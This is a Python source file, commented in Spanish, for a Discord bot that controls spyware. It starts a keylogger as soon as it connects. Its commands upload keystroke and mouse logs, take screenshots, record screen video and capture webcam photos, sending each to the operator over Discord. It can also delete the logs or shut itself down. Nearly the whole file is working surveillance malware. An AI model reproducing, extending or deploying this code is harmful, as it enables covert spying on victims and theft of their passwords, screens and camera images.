## Librerias ##

import discord
from discord.ext import commands
import os
import dotenv
import keylogger as key 
import syware as video

## Discord ##
env = dotenv.find_dotenv('Tokkens.env')
dotenv.load_dotenv(env)
TOKEN = os.getenv('DISCORD_TOKEN')

if not TOKEN:
    raise ValueError("No se encontro el TOKEN")

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)
key_logger = key.Keylog()

@bot.event
async def on_ready():
    print(f'Bot {bot.user.name} conectado!')
    await bot.change_presence(activity=discord.Game(name="Escribe !ayuda"))
    key_logger.listen_thread()

@bot.command()
async def stoplogs(ctx):
    await ctx.send("Deteniendo logger")
    key_logger.stop_thread()
    
@bot.command()
async def startlogs(ctx):
    await ctx.send("Iniciando logs")
    key_logger.listen_thread()
    
@bot.command()
async def deletelogs(ctx):
    "se necesitan permisos de admin"
    await ctx.send("Borrando logs antiguos")
    if os.path.exists(key_logger.keyslog):
        os.remove(key_logger.keyslog)
    if os.path.exists(key_logger.mouselog):
        os.remove(key_logger.mouselog)
    else:
        await ctx.send("Archivos no existentes")
        
@bot.command()
async def logs(ctx):
    "se necesitan permisos de admin"
    try:
        await ctx.send(file=discord.File(key_logger.keyslog))
        await ctx.send(file=discord.File(key_logger.mouselog))
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
async def capture(ctx):
    "se necesitan permisos de admin"
    try:
        screen = video.screenshot()
        screen.checkpath()
        screen.takensave()
        await ctx.send(file=discord.File(f"takensend/image/Imagen {screen.datetime}.jpg"))
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
async def record(ctx):
    "Se necesitan permisos del admin "
    try:
        await ctx.send("Grabando video")
        recorder = video.videotake()
        recorder.checkpath()
        recorder.start_video_thread()
        await ctx.send(file=discord.File(f"takensend/video/Video {recorder.datetime}.avi"))
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
async def webcam(ctx):
    "se necesitan permisos del admin"
    try:
        await ctx.send("Tomando captura de camara")
        cam = video.camtake()
        cam.checkpath()
        cam.takecamphoto()
        
        if os.path.exists(f"takensend/image/Camara {cam.datetime}.jpg"):
            await ctx.send(file=discord.File(f"takensend/image/Camara {cam.datetime}.jpg"))
        elif os.path.exists(f"takensend/image/Camara2 {cam.datetime}.jpg"):
            await ctx.send(file=discord.File(f"takensend/image/Camara2 {cam.datetime}.jpg"))
        else:
            await ctx.send("Que verga paso")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
async def die(ctx):
    "se necesitan permisos de admin"
    key_logger.stop_thread()
    await ctx.send("https://tenor.com/cAWHmLGZsdT.gif")
    await ctx.send("Goodbye!")
    exit(1)

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.NotOwner):
        await ctx.send("No tienes permisos de admin")
    else:
        print(f"Error: {error}")

if __name__ == "__main__":
    bot.run(TOKEN)
       
